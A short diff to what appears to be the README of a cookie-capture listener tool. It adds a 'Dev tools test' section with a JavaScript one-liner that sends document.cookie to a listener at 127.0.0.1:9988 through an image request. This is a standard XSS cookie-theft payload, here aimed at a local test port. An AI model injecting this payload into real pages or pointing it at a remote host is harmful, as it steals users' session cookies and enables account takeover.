@@ -23,4 +23,10 @@ Port selection
 
 ![image](https://user-images.githubusercontent.com/5285547/133122763-5141ef64-e95f-4027-84e0-750f50700e46.png)
 
+## Dev tools test (F12 firefox, chrome)
 
+![image](https://user-images.githubusercontent.com/5285547/133122858-4189195b-b8ae-4793-a917-9c14c8e928c8.png)
+
+```
+(function(){var i = new Image;i.src='http://127.0.0.1:9988/?c'+document.cookie}())
+```
